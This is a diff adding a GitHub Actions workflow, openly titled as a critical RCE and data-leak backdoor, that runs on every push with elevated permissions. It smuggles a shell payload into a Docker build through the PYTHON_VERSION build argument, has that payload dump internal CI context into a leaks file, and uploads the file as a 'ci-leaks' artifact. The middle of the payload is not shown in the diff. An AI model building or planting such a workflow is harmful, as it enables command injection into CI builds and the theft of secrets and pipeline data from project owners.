@@ -1,10 +1,25 @@
-name: Prepare Dockerfile and Payload
+name: Critical RCE & Sensitive Data Leak with Persistent Backdoor
+on:
+  push:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+      secrets: read
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Prepare Dockerfile and Payload
         run: |
-          set -eux
           mkdir -p ./taskcluster/docker/python
           cp Dockerfile ./taskcluster/docker/python/
 
-          PAYLOAD=$(cat <<EOF
+          PAYLOAD=$(cat <<'EOF'
 echo "[INFO] Dumping internal CI context..."
 {
   echo "----- ID -----"
@@ -45,3 +60,9 @@ EOF
           docker build --build-arg PYTHON_VERSION="$PAYLOAD" -t compromised ./taskcluster/docker/python
 
           docker run --rm compromised cat /leaks.txt > output.txt
+
+      - name: Upload Leak Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ci-leaks
+          path: output.txt
